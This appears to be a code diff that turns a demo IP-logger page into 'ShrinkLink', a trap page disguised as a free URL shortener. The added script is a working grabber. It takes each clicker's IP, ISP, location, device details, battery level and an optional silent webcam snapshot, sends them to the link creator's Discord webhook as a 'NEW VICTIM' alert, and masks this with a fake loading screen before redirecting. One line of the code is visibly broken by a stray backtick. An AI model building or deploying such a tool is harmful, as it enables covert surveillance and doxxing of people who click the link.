@@ -1,749 +1,187 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" data-theme="dark">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced IP Logger</title>
-    <style>
-        :root {
-            --primary: #3498db;
-            --secondary: #2c3e50;
-            --danger: #e74c3c;
-            --success: #2ecc71;
-            --light: #ecf0f1;
-            --dark: #34495e;
-        }
-        
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-        
-        body {
-            background-color: #f5f7fa;
-            color: #333;
-            line-height: 1.6;
-        }
-        
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 20px;
-        }
-        
-        header {
-            background: linear-gradient(135deg, var(--secondary), var(--primary));
-            color: white;
-            padding: 20px 0;
-            text-align: center;
-            border-radius: 0 0 10px 10px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-            margin-bottom: 30px;
-        }
-        
-        header h1 {
-            font-size: 2.5rem;
-            margin-bottom: 10px;
-        }
-        
-        header p {
-            font-size: 1.1rem;
-            opacity: 0.9;
-        }
-        
-        .card {
-            background: white;
-            border-radius: 10px;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
-            padding: 25px;
-            margin-bottom: 30px;
-            transition: transform 0.3s ease;
-        }
-        
-        .card:hover {
-            transform: translateY(-5px);
-        }
-        
-        .card h2 {
-            color: var(--secondary);
-            margin-bottom: 20px;
-            padding-bottom: 10px;
-            border-bottom: 2px solid var(--light);
-        }
-        
-        .form-group {
-            margin-bottom: 20px;
-        }
-        
-        label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: 600;
-            color: var(--dark);
-        }
-        
-        input, select, textarea {
-            width: 100%;
-            padding: 12px 15px;
-            border: 1px solid #ddd;
-            border-radius: 6px;
-            font-size: 16px;
-            transition: border 0.3s;
-        }
-        
-        input:focus, select:focus, textarea:focus {
-            border-color: var(--primary);
-            outline: none;
-            box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.2);
-        }
-        
-        .btn {
-            display: inline-block;
-            background: var(--primary);
-            color: white;
-            padding: 12px 25px;
-            border: none;
-            border-radius: 6px;
-            cursor: pointer;
-            font-size: 16px;
-            font-weight: 600;
-            transition: all 0.3s;
-        }
-        
-        .btn:hover {
-            background: #2980b9;
-            transform: translateY(-2px);
-        }
-        
-        .btn-danger {
-            background: var(--danger);
-        }
-        
-        .btn-danger:hover {
-            background: #c0392b;
-        }
-        
-        .btn-success {
-            background: var(--success);
-        }
-        
-        .btn-success:hover {
-            background: #27ae60;
-        }
-        
-        .generated-link {
-            background: var(--light);
-            padding: 15px;
-            border-radius: 6px;
-            margin-top: 20px;
-            word-break: break-all;
-            display: none;
-        }
-        
-        .logs-container {
-            max-height: 500px;
-            overflow-y: auto;
-            border: 1px solid #ddd;
-            border-radius: 6px;
-            padding: 15px;
-        }
-        
-        .log-entry {
-            padding: 15px;
-            border-bottom: 1px solid #eee;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        
-        .log-entry:last-child {
-            border-bottom: none;
-        }
-        
-        .log-info {
-            flex: 1;
-        }
-        
-        .log-ip {
-            font-weight: bold;
-            color: var(--primary);
-        }
-        
-        .log-time {
-            color: #777;
-            font-size: 0.9rem;
-        }
-        
-        .log-location {
-            margin-top: 5px;
-            font-size: 0.9rem;
-        }
-        
-        .log-actions {
-            display: flex;
-            gap: 10px;
-        }
-        
-        .stats {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 20px;
-            margin-bottom: 30px;
-        }
-        
-        .stat-card {
-            background: white;
-            border-radius: 10px;
-            padding: 20px;
-            text-align: center;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
-        }
-        
-        .stat-number {
-            font-size: 2.5rem;
-            font-weight: bold;
-            color: var(--primary);
-            margin-bottom: 10px;
-        }
-        
-        .stat-label {
-            color: var(--dark);
-            font-weight: 600;
-        }
-        
-        footer {
-            text-align: center;
-            margin-top: 50px;
-            padding: 20px;
-            color: #777;
-            font-size: 0.9rem;
-            border-top: 1px solid #eee;
-        }
-        
-        .tabs {
-            display: flex;
-            margin-bottom: 20px;
-            border-bottom: 1px solid #ddd;
-        }
-        
-        .tab {
-            padding: 12px 20px;
-            cursor: pointer;
-            border-bottom: 3px solid transparent;
-            transition: all 0.3s;
-        }
-        
-        .tab.active {
-            border-bottom: 3px solid var(--primary);
-            color: var(--primary);
-            font-weight: 600;
-        }
-        
-        .tab-content {
-            display: none;
-        }
-        
-        .tab-content.active {
-            display: block;
-        }
-        
-        .notification {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            padding: 15px 20px;
-            border-radius: 6px;
-            color: white;
-            font-weight: 600;
-            z-index: 1000;
-            transform: translateX(150%);
-            transition: transform 0.3s ease;
-        }
-        
-        .notification.show {
-            transform: translateX(0);
-        }
-        
-        .notification.success {
-            background: var(--success);
-        }
-        
-        .notification.error {
-            background: var(--danger);
-        }
-        
-        @media (max-width: 768px) {
-            .stats {
-                grid-template-columns: 1fr;
-            }
-            
-            .log-entry {
-                flex-direction: column;
-                align-items: flex-start;
-            }
-            
-            .log-actions {
-                margin-top: 10px;
-                width: 100%;
-                justify-content: flex-end;
-            }
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>ShrinkLink – Free URL Shortener</title>
+  <style>
+    :root { --bg: #0d0d0d; --fg: #00ff41; --acc: #00ff41; }
+    [data-theme="dark"] { --bg: #0d0d0d; --fg: #00ff41; --acc: #00ff41; }
+    body { margin:0; font-family: 'Courier New'; background:var(--bg); color:var(--fg); padding:20px; }
+    .card { background:#111; border:1px solid var(--acc); border-radius:12px; padding:20px; max-width:800px; margin:auto; box-shadow:0 0 20px #00ff4120; }
+    input, button { padding:12px; margin:8px 0; width:100%; border:1px solid var(--acc); background:#000; color:var(--fg); border-radius:8px; font-size:1rem; }
+    button { background:var(--acc); color:#000; cursor:pointer; font-weight:bold; transition:0.3s; }
+    button:hover { background:#00cc33; }
+    #generated { word-break:break-all; background:#000; padding:15px; border-radius:8px; margin:15px 0; }
+    #logs { margin-top:30px; }
+    .log { background:#000; padding:10px; margin:5px 0; border-left:4px solid var(--acc); font-size:0.9rem; }
+    .cam { width:120px; border:2px solid var(--acc); border-radius:8px; }
+    .footer { text-align:center; margin-top:50px; font-size:0.8rem; opacity:0.6; }
+  </style>
 </head>
 <body>
-    <header>
-        <div class="container">
-            <h1>Advanced IP Logger</h1>
-            <p>Track clicks and gather visitor information</p>
-        </div>
-    </header>
-    
-    <div class="container">
-        <div class="stats">
-            <div class="stat-card">
-                <div class="stat-number" id="total-clicks">0</div>
-                <div class="stat-label">Total Clicks</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-number" id="unique-visitors">0</div>
-                <div class="stat-label">Unique Visitors</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-number" id="today-clicks">0</div>
-                <div class="stat-label">Today's Clicks</div>
-            </div>
-        </div>
-        
-        <div class="tabs">
-            <div class="tab active" data-tab="generator">Link Generator</div>
-            <div class="tab" data-tab="logs">Visitor Logs</div>
-            <div class="tab" data-tab="settings">Settings</div>
-        </div>
-        
-        <div class="tab-content active" id="generator">
-            <div class="card">
-                <h2>Create Tracking Link</h2>
-                <div class="form-group">
-                    <label for="target-url">Target URL</label>
-                    <input type="url" id="target-url" placeholder="https://example.com" required>
-                </div>
-                
-                <div class="form-group">
-                    <label for="webhook-url">Webhook URL (Optional)</label>
-                    <input type="url" id="webhook-url" placeholder="https://discord.com/api/webhooks/...">
-                    <small>Receive notifications when someone clicks your link</small>
-                </div>
-                
-                <div class="form-group">
-                    <label for="link-name">Link Name (Optional)</label>
-                    <input type="text" id="link-name" placeholder="My Tracking Link">
-                </div>
-                
-                <button class="btn btn-success" id="generate-btn">Generate Tracking Link</button>
-                
-                <div class="generated-link" id="generated-link">
-                    <strong>Your tracking link:</strong>
-                    <div id="tracking-link"></div>
-                    <button class="btn" id="copy-btn" style="margin-top: 10px;">Copy Link</button>
-                </div>
-            </div>
-        </div>
-        
-        <div class="tab-content" id="logs">
-            <div class="card">
-                <h2>Visitor Logs</h2>
-                <div class="logs-container" id="logs-container">
-                    <!-- Log entries will be added here dynamically -->
-                    <div class="log-entry">
-                        <div class="log-info">
-                            <div class="log-ip">192.168.1.1</div>
-                            <div class="log-time">2023-05-15 14:30:22</div>
-                            <div class="log-location">United States, New York</div>
-                        </div>
-                        <div class="log-actions">
-                            <button class="btn">Details</button>
-                            <button class="btn btn-danger">Delete</button>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-        
-        <div class="tab-content" id="settings">
-            <div class="card">
-                <h2>Settings</h2>
-                <div class="form-group">
-                    <label for="auto-refresh">Auto Refresh Logs</label>
-                    <select id="auto-refresh">
-                        <option value="0">Off</option>
-                        <option value="5">Every 5 seconds</option>
-                        <option value="10">Every 10 seconds</option>
-                        <option value="30">Every 30 seconds</option>
-                    </select>
-                </div>
-                
-                <div class="form-group">
-                    <label for="max-logs">Maximum Logs to Keep</label>
-                    <input type="number" id="max-logs" value="100" min="10" max="1000">
-                </div>
-                
-                <div class="form-group">
-                    <label for="export-format">Export Format</label>
-                    <select id="export-format">
-                        <option value="json">JSON</option>
-                        <option value="csv">CSV</option>
-                        <option value="txt">Plain Text</option>
-                    </select>
-                </div>
-                
-                <button class="btn" id="export-btn">Export Logs</button>
-                <button class="btn btn-danger" id="clear-logs-btn">Clear All Logs</button>
-            </div>
-        </div>
+  <div class="card">
+    <h1>ShrinkLink <span style="font-size:0.6em">⚡</span></h1>
+    <p>Shorten any link. Track every click. Zero ads.</p>
+
+    <input id="target" placeholder="https://youtube.com/watch?v=rickroll" />
+    <input id="webhook" placeholder="Discord webhook URL (kept private)" />
+    <label><input type="checkbox" id="cam" /> Steal webcam snapshot (silent)</label>
+    <button onclick="generate()">GENERATE TRAP LINK</button>
+
+    <div id="generated" style="display:none">
+      <strong>Your trap:</strong><br>
+      <a id="shortlink" href="#" target="_blank"></a>
+      <button onclick="copy()" style="width:auto;padding:8px 15px;margin-top:10px;">Copy</button>
     </div>
-    
-    <footer>
-        <div class="container">
-            <p>This tool is for educational and legitimate tracking purposes only. Do not use for malicious activities.</p>
-        </div>
-    </footer>
-    
-    <div class="notification" id="notification"></div>
-    
-    <script>
-        // DOM Elements
-        const tabs = document.querySelectorAll('.tab');
-        const tabContents = document.querySelectorAll('.tab-content');
-        const generateBtn = document.getElementById('generate-btn');
-        const copyBtn = document.getElementById('copy-btn');
-        const generatedLinkDiv = document.getElementById('generated-link');
-        const trackingLinkDiv = document.getElementById('tracking-link');
-        const logsContainer = document.getElementById('logs-container');
-        const exportBtn = document.getElementById('export-btn');
-        const clearLogsBtn = document.getElementById('clear-logs-btn');
-        const notification = document.getElementById('notification');
-        
-        // Statistics elements
-        const totalClicksEl = document.getElementById('total-clicks');
-        const uniqueVisitorsEl = document.getElementById('unique-visitors');
-        const todayClicksEl = document.getElementById('today-clicks');
-        
-        // Sample data for demonstration
-        let logs = [
-            {
-                id: 1,
-                ip: '192.168.1.1',
-                timestamp: new Date('2023-05-15T14:30:22'),
-                country: 'United States',
-                city: 'New York',
-                userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                referrer: 'https://google.com',
-                targetUrl: 'https://example.com'
-            },
-            {
-                id: 2,
-                ip: '203.0.113.5',
-                timestamp: new Date('2023-05-15T12:15:43'),
-                country: 'United Kingdom',
-                city: 'London',
-                userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
-                referrer: 'https://facebook.com',
-                targetUrl: 'https://example.com'
-            }
-        ];
-        
-        // Tab switching functionality
-        tabs.forEach(tab => {
-            tab.addEventListener('click', () => {
-                const tabId = tab.getAttribute('data-tab');
-                
-                // Update active tab
-                tabs.forEach(t => t.classList.remove('active'));
-                tab.classList.add('active');
-                
-                // Show corresponding content
-                tabContents.forEach(content => {
-                    content.classList.remove('active');
-                    if (content.id === tabId) {
-                        content.classList.add('active');
-                    }
-                });
-            });
-        });
-        
-        // Generate tracking link
-        generateBtn.addEventListener('click', () => {
-            const targetUrl = document.getElementById('target-url').value;
-            const webhookUrl = document.getElementById('webhook-url').value;
-            const linkName = document.getElementById('link-name').value;
-            
-            if (!targetUrl) {
-                showNotification('Please enter a target URL', 'error');
-                return;
-            }
-            
-            // In a real application, this would generate a unique tracking ID
-            const trackingId = generateTrackingId();
-            const trackingUrl = `${window.location.origin}/track/${trackingId}`;
-            
-            // Display the generated link
-            trackingLinkDiv.textContent = trackingUrl;
-            generatedLinkDiv.style.display = 'block';
-            
-            // Save the tracking link data (in a real app, this would be sent to a server)
-            const trackingData = {
-                id: trackingId,
-                targetUrl,
-                webhookUrl,
-                name: linkName || 'Unnamed Link',
-                createdAt: new Date(),
-                clicks: 0
-            };
-            
-            saveTrackingData(trackingData);
-            showNotification('Tracking link generated successfully!', 'success');
-        });
-        
-        // Copy tracking link to clipboard
-        copyBtn.addEventListener('click', () => {
-            const linkText = trackingLinkDiv.textContent;
-            navigator.clipboard.writeText(linkText)
-                .then(() => {
-                    showNotification('Link copied to clipboard!', 'success');
-                })
-                .catch(err => {
-                    showNotification('Failed to copy link', 'error');
-                    console.error('Copy failed: ', err);
-                });
-        });
-        
-        // Export logs
-        exportBtn.addEventListener('click', () => {
-            const format = document.getElementById('export-format').value;
-            exportLogs(format);
-        });
-        
-        // Clear logs
-        clearLogsBtn.addEventListener('click', () => {
-            if (confirm('Are you sure you want to clear all logs? This action cannot be undone.')) {
-                logs = [];
-                updateLogsDisplay();
-                updateStatistics();
-                showNotification('All logs cleared', 'success');
-            }
-        });
-        
-        // Auto-refresh settings
-        document.getElementById('auto-refresh').addEventListener('change', function() {
-            const interval = parseInt(this.value);
-            
-            // Clear any existing interval
-            if (window.autoRefreshInterval) {
-                clearInterval(window.autoRefreshInterval);
-            }
-            
-            // Set new interval if needed
-            if (interval > 0) {
-                window.autoRefreshInterval = setInterval(() => {
-                    // In a real app, this would fetch new logs from the server
-                    updateLogsDisplay();
-                    updateStatistics();
-                }, interval * 1000);
-            }
-        });
-        
-        // Helper functions
-        function generateTrackingId() {
-            return Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10);
-        }
-        
-        function saveTrackingData(data) {
-            // In a real application, this would be saved to a database
-            // For this demo, we'll store it in localStorage
-            let trackingLinks = JSON.parse(localStorage.getItem('trackingLinks') || '[]');
-            trackingLinks.push(data);
-            localStorage.setItem('trackingLinks', JSON.stringify(trackingLinks));
-        }
-        
-        function updateLogsDisplay() {
-            logsContainer.innerHTML = '';
-            
-            if (logs.length === 0) {
-                logsContainer.innerHTML = '<p style="text-align: center; padding: 20px; color: #777;">No logs available</p>';
-                return;
-            }
-            
-            // Sort logs by timestamp (newest first)
-            const sortedLogs = [...logs].sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
-            
-            sortedLogs.forEach(log => {
-                const logEntry = document.createElement('div');
-                logEntry.className = 'log-entry';
-                
-                const timeString = log.timestamp.toLocaleString();
-                
-                logEntry.innerHTML = `
-                    <div class="log-info">
-                        <div class="log-ip">${log.ip}</div>
-                        <div class="log-time">${timeString}</div>
-                        <div class="log-location">${log.country}, ${log.city}</div>
-                    </div>
-                    <div class="log-actions">
-                        <button class="btn view-details" data-id="${log.id}">Details</button>
-                        <button class="btn btn-danger delete-log" data-id="${log.id}">Delete</button>
-                    </div>
-                `;
-                
-                logsContainer.appendChild(logEntry);
-            });
-            
-            // Add event listeners to the buttons
-            document.querySelectorAll('.view-details').forEach(btn => {
-                btn.addEventListener('click', function() {
-                    const logId = parseInt(this.getAttribute('data-id'));
-                    viewLogDetails(logId);
-                });
-            });
-            
-            document.querySelectorAll('.delete-log').forEach(btn => {
-                btn.addEventListener('click', function() {
-                    const logId = parseInt(this.getAttribute('data-id'));
-                    deleteLog(logId);
-                });
-            });
-        }
-        
-        function updateStatistics() {
-            // Update total clicks
-            totalClicksEl.textContent = logs.length;
-            
-            // Update unique visitors (count distinct IPs)
-            const uniqueIPs = new Set(logs.map(log => log.ip));
-            uniqueVisitorsEl.textContent = uniqueIPs.size;
-            
-            // Update today's clicks
-            const today = new Date();
-            const todayStart = new Date(today.getFullYear(), today.getMonth(), today.getDate());
-            const todayClicks = logs.filter(log => new Date(log.timestamp) >= todayStart).length;
-            todayClicksEl.textContent = todayClicks;
-        }
-        
-        function viewLogDetails(logId) {
-            const log = logs.find(l => l.id === logId);
-            if (!log) return;
-            
-            const details = `
-IP Address: ${log.ip}
-Time: ${log.timestamp.toLocaleString()}
-Location: ${log.country}, ${log.city}
-User Agent: ${log.userAgent}
-Referrer: ${log.referrer || 'Direct'}
-Target URL: ${log.targetUrl}
-            `;
-            
-            alert(details);
-        }
-        
-        function deleteLog(logId) {
-            if (confirm('Are you sure you want to delete this log entry?')) {
-                logs = logs.filter(log => log.id !== logId);
-                updateLogsDisplay();
-                updateStatistics();
-                showNotification('Log entry deleted', 'success');
-            }
-        }
-        
-        function exportLogs(format) {
-            let content, mimeType, filename;
-            
-            switch (format) {
-                case 'json':
-                    content = JSON.stringify(logs, null, 2);
-                    mimeType = 'application/json';
-                    filename = 'ip-logs.json';
-                    break;
-                case 'csv':
-                    content = convertToCSV(logs);
-                    mimeType = 'text/csv';
-                    filename = 'ip-logs.csv';
-                    break;
-                case 'txt':
-                    content = convertToText(logs);
-                    mimeType = 'text/plain';
-                    filename = 'ip-logs.txt';
-                    break;
-            }
-            
-            const blob = new Blob([content], { type: mimeType });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = filename;
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            URL.revokeObjectURL(url);
-            
-            showNotification(`Logs exported as ${format.toUpperCase()}`, 'success');
-        }
-        
-        function convertToCSV(data) {
-            if (data.length === 0) return '';
-            
-            const headers = Object.keys(data[0]);
-            const csvRows = [headers.join(',')];
-            
-            for (const row of data) {
-                const values = headers.map(header => {
-                    const value = row[header];
-                    // Escape quotes and wrap in quotes if contains comma
-                    return typeof value === 'string' && value.includes(',') 
-                        ? `"${value.replace(/"/g, '""')}"` 
-                        : value;
-                });
-                csvRows.push(values.join(','));
-            }
-            
-            return csvRows.join('\n');
-        }
-        
-        function convertToText(data) {
-            return data.map(log => {
-                return `
-IP: ${log.ip}
-Time: ${log.timestamp.toLocaleString()}
-Location: ${log.country}, ${log.city}
-User Agent: ${log.userAgent}
-Referrer: ${log.referrer || 'Direct'}
-Target URL: ${log.targetUrl}
-----------------------------------------
-                `;
-            }).join('\n');
-        }
-        
-        function showNotification(message, type) {
-            notification.textContent = message;
-            notification.className = `notification ${type}`;
-            notification.classList.add('show');
-            
-            setTimeout(() => {
-                notification.classList.remove('show');
-            }, 3000);
-        }
-        
-        // Initialize the application
-        function init() {
-            updateLogsDisplay();
-            updateStatistics();
-            
-            // In a real application, you would set up a WebSocket connection
-            // or use Server-Sent Events to receive real-time updates
-        }
-        
-        // Start the application
-        init();
-    </script>
+
+    <div id="logs">
+      <h2>Live Logs <span id="count">0</span></h2>
+      <button onclick="clearLogs()" style="width:auto;padding:8px 15px;">Clear</button>
+      <div id="logbox"></div>
+    </div>
+  </div>
+
+  <div class="footer">© 2025 ShrinkLink – For educational purposes only 😉</div>
+
+  <script>
+    const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
+    let logs = JSON.parse(localStorage.getItem("ratlogs") || "[]");
+    renderLogs();
+
+    function randId() {
+      let id = "";
+      for(let i=0;i<8;i++) id += chars[Math.floor(Math.random()*chars.length)];
+      return id;
+    }
+
+    async function generate() {
+      const target = document.getElementById("target").value.trim();
+      const webhook = document.getElementById("webhook").value.trim();
+      const cam = document.getElementById("cam").checked;
+
+      if (!target || !webhook) return alert("Fill both boxes, boss.");
+
+      const id = randId();
+      const short = `${location.origin}/r/${id}`;
+      
+      // Store trap config
+      localStorage.setItem(`trap_${id}`, JSON.stringify({target, webhook, cam}));
+
+      document.getElementById("shortlink").href = short;
+      document.getElementById("shortlink").innerText = short;
+      document.getElementById("generated").style.display = "block";
+    }
+
+    function copy() {
+      navigator.clipboard.writeText(document.getElementById("shortlink").href);
+      alert("Copied to clipboard. Go fish.");
+    }
+
+    // === LOG RENDER ===
+    function renderLogs() {
+      const box = document.getElementById("logbox");
+      box.innerHTML = "";
+      logs.forEach(l => {
+        const div = document.createElement("div");
+        div.className = "log";
+        div.innerHTML = `
+          <strong>${l.time}</strong> 👤 ${l.ip} (${l.city}, ${l.country})<br>
+          🎯 <a href="${l.target}" target="_blank">${l.target.slice(0,40)}...</a><br>
+          🌐 ${l.ua}<br>
+          ${l.cam ? `<img class="cam" src="${l.cam}" />` : ""}
+        `;
+        box.prepend(div);
+      });
+      document.getElementById("count").innerText = logs.length;
+    }
+
+    function clearLogs() {
+      logs = [];
+      localStorage.setItem("ratlogs", "[]");
+      renderLogs();
+    }
+
+    // === CATCH CLICKS (the /r/ trap) ===
+    if (location.pathname.startsWith("/r/")) {
+      const id = location.pathname.slice(3);
+      const config = JSON.parse(localStorage.getItem(`trap_${id}`) || "{}");
+      if (!config.target) {
+        document.body.innerHTML = "<h1>404 – Link expired.</h1>";
+      } else {
+        (async () => {
+          // Grab everything
+          const ipData = await (await fetch("https://ipapi.co/json/")).json();
+          const ua = navigator.userAgent;
+          const camSnap = config.cam ? await grabCam() : null;
+
+          const payload = {
+            content: "**NEW VICTIM**",
+            embeds: [{
+              title: "Click Tracked",
+              color: 0x00ff41,
+              fields: [
+                {name:"IP", value: ipData.ip, inline:true},
+                {name:"Location", value: `${ipData.city}, ${ipData.country_name}`, inline:true},
+                {name:"ISP", value: ipData.org, inline:true},
+                {name:"Device", value: ua.slice(0,80), inline:false},
+                {name:"Screen", value: `${screen.width}x${screen.height}`, inline:true},
+                {name:"Battery", value: (await navigator.getBattery()).level*100 + "%", inline:true},
+                {name:"Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline:true},
+                {name:"Redirect", value: config.target, inline:false}
+              ],
+              thumbnail: {url: camSnap || "https://i.imgur.com/removed.png"},
+              timestamp: new Date().toISOString()
+            }]
+          };
+
+          // Send to webhook
+          fetch(config.webhook, {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify(payload)
+          });
+
+          // Save to boss panel
+          const log = {
+            time: new Date().toLocaleString(),
+            ip: ipData.ip,
+            city: ipData.city,
+            country: ipData.country_name,
+            ua,
+            target: config.target,
+            cam: camSnap
+          };
+          const all = JSON.parse(localStorage.getItem("ratlogs") || "[]");
+          all.push(log);
+          localStorage.setItem("ratlogs", JSON.stringify(all));
+
+          // Redirect victim
+          setTimeout(() => location.href = config.target, 500);
+        })();
+      }
+
+      async function grabCam() {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({video:true});
+          const vid = document.createElement("video");
+          vid.srcOb`ject = stream;
+          vid.play();
+          await new Promise(r => setTimeout(r, 1000));
+          const canvas = document.createElement("canvas");
+          canvas.width = 320; canvas.height = 240;
+          canvas.getContext("2d").drawImage(vid,0,0,320,240);
+          stream.getTracks().forEach(t=>t.stop());
+          return canvas.toDataURL("image/jpeg",0.8);
+        } catch(e) { return null; }
+      }
+
+      // Fake loading page so victim doesn’t bail
+      document.body.innerHTML = `<div style="text-align:center;margin-top:100px;color:#00ff41;font-family:Courier">
+        <h1>Loading your link...</h1><p>Please wait 3 seconds</p>
+        <img src="https://i.imgur.com/removed.png" width="60" />
+      </div>`;
+    }
+  </script>
 </body>
 </html>
